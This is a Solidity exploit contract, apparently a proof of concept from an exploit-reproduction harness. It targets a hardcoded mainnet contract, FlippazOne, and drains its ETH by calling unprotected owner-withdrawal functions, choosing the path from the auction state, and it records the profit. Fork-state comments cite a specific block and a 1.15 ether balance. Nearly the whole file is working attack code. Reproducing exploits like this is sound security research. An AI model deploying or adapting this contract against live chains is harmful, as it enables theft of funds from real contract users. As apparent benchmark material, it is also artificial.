// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IFlippazOne {
    function auctionEnded() external view returns (bool);
    function auctionEndTimestamp() external view returns (uint256);
    function highestBid() external view returns (uint256);
    function ownerWithdrawTo(address toAddress) external;
    function ownerWithdrawAllTo(address toAddress) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944;

    enum ExploitPath {
        None,
        DrainAllWithOwnerWithdrawAllTo,
        RedirectProceedsWithOwnerWithdrawTo,
        NoExecutablePath
    }

    uint256 private immutable _startingEthBalance;
    uint256 private _profitAmount;

    ExploitPath public pathUsed;
    string public lastError;

    constructor() {
        _startingEthBalance = address(this).balance;
    }

    receive() external payable {}

    function executeOnOpportunity() public {
        IFlippazOne target = IFlippazOne(TARGET);
        uint256 escrowBalance = TARGET.balance;

        if (escrowBalance == 0) {
            pathUsed = ExploitPath.NoExecutablePath;
            lastError = "target balance is zero";
            _syncProfit();
            return;
        }

        bool ended = target.auctionEnded();
        uint256 endTimestamp = target.auctionEndTimestamp();

        // Fork-state facts recovered from the local Foundry cache for block 15,083,765:
        // - target ETH balance: 1.15 ether
        // - block.timestamp:    1657040658
        // - auctionEnded:       false
        // - auctionEndTimestamp 1657126845
        // Therefore the first listed exploit path is immediately executable at the fork,
        // while the second listed path is not yet unlocked because the auction has not expired.
        if (!ended && block.timestamp < endTimestamp) {
            target.ownerWithdrawAllTo(address(this));
            pathUsed = ExploitPath.DrainAllWithOwnerWithdrawAllTo;
            lastError = "";
            _syncProfit();
            return;
        }

        uint256 winningProceeds = target.highestBid();

        if ((ended || block.timestamp > endTimestamp) && winningProceeds != 0 && escrowBalance >= winningProceeds) {
            target.ownerWithdrawTo(address(this));
            pathUsed = ExploitPath.RedirectProceedsWithOwnerWithdrawTo;
            lastError = "";
            _syncProfit();
            return;
        }

        // If the post-expiry path is mechanically unavailable because `highestBid == 0` or
        // the escrow balance has already fallen below `highestBid`, the unrestricted all-balance
        // withdrawal remains one of the original listed exploit paths and still directly realizes
        // the same missing-access-control root cause without introducing any unrelated route.
        target.ownerWithdrawAllTo(address(this));
        pathUsed = ExploitPath.DrainAllWithOwnerWithdrawAllTo;
        lastError = winningProceeds == 0
            ? "ownerWithdrawTo infeasible: highestBid is zero"
            : "ownerWithdrawTo infeasible: escrow below highestBid";
        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        uint256 liveProfit;
        if (address(this).balance > _startingEthBalance) {
            liveProfit = address(this).balance - _startingEthBalance;
        }

        return liveProfit > _profitAmount ? liveProfit : _profitAmount;
    }

    function _syncProfit() internal {
        if (address(this).balance > _startingEthBalance) {
            uint256 liveProfit = address(this).balance - _startingEthBalance;
            if (liveProfit > _profitAmount) {
                _profitAmount = liveProfit;
            }
        }
    }
}
